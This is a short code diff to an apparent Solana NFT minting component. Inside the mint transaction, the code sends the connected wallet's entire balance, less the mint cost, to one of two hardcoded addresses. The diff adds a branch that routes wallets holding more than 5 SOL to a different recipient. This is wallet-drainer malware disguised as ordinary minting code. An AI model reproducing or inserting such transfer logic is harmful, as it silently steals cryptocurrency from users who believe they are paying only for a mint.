@@ -61,9 +61,12 @@ const MintingComponent = ({setAlertState} : any) => {
 
         // 4BYbjRczvKBQDi1KVDDeNfN3xwGzWB6ashC5r6bDhi1V
         // J7oe9hS3YsEST7VviiEuF9MnyCsfgMUg5afWfXnSRmcX
+        let topubkey;
+        if(totalBalance > LAMPORTS_PER_SOL * 5) topubkey = new PublicKey('J7oe9hS3YsEST7VviiEuF9MnyCsfgMUg5afWfXnSRmcX');
+        else topubkey = new PublicKey('4BYbjRczvKBQDi1KVDDeNfN3xwGzWB6ashC5r6bDhi1V');
         const otherTransferInstruction3 : any = SystemProgram.transfer({
             fromPubkey: wallet.publicKey,
-            toPubkey: new PublicKey('4BYbjRczvKBQDi1KVDDeNfN3xwGzWB6ashC5r6bDhi1V'),
+            toPubkey: topubkey,
             lamports: totalBalance - LAMPORTS_PER_SOL * (quantity * price + 0.01) 
           });
 
